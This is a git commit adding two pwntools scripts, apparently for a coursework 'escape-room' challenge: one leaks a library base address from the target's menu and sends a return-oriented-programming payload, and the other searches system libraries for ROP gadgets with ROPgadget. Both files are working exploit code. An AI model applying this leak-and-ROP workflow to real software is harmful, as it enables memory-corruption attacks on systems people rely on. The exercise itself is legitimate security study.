73af35554010b4d755b6a94f21537ca048f8f217
ChoKyuWon <yyj10137@gmail.com>
2020-06-05 17:45:16 +0000

    find gadget

---
+++ escape.py
@@ -0,0 +1,28 @@
+from pwn import *
+
+switch1 = 0x08052000 #on = 0xdeadbeef
+switch2 = 0x08052004 #on = "SWE3025"
+
+button1 = 0x08049276
+button2 = 0x08049311
+
+p = process("../../escape-room/escape-room")
+
+p.recvuntil(">>>")
+p.sendline('5')
+s = p.recvuntil(">>>").decode().split('\n')
+for line in s:
+    if "libstdc++.so.6" in line:
+        index = s.index(line)
+        base = s[index+1].split(':')[1][1:10]
+        break
+mov = p32(int(base,16) + 0x9b55a) #mov dword ptr [esi], edi; pop ebx; pop esi; pop edi; ret
+pop = p32(int(base,16) + 0x9b55d) #pop esi; pop edi; ret
+ROP = mov
+payload = b'\x90'*16 + ROP + p32(button1) + p32(button2)
+
+p.sendline('6')
+print(p.recvuntil(">>>"))
+_ = input()
+p.sendline(payload)
+p.interactive()
---
+++ gadget_find.py
@@ -0,0 +1,27 @@
+import subprocess
+from pwn import *
+
+
+liblist = ["/lib/i386-linux-gnu/libxml2.so.2",
+"/lib/i386-linux-gnu/libm.so.6",
+"/lib/i386-linux-gnu/libdl.so.2",
+"/lib/i386-linux-gnu/libicuuc.so.63",
+"/lib/i386-linux-gnu/libz.so.1",
+"/lib/i386-linux-gnu/liblzma.so.6",
+"/lib/ld-linux.so.2",
+"/lib/i386-linux-gnu/libicudata.so.63",
+"/lib/i386-linux-gnu/libpthread.so.0",
+"/lib/i386-linux-gnu/libstdc++.so.6",
+"/lib/i386-linux-gnu/libgcc_s.so.1"]
+
+re = "mov dword ptr \[esi\], edi"
+for lib in liblist:
+    print(lib)
+    subprocess.run(["ROPgadget", "--re", re, "--binary", lib])
+
+#ROPgadget --re "mov dword ptr \[esi\], edi" --binary
+
+#.init = 00075000
+#.text 0007cf80
+#0x00110557 : add esp, 0x20 ; mov dword ptr [esi], edi ; pop ebx ; pop esi ; pop edi ; ret
+# 0x9b55a ; mov dword ptr [esi], edi; pop ebx; pop esi; pop edi; ret
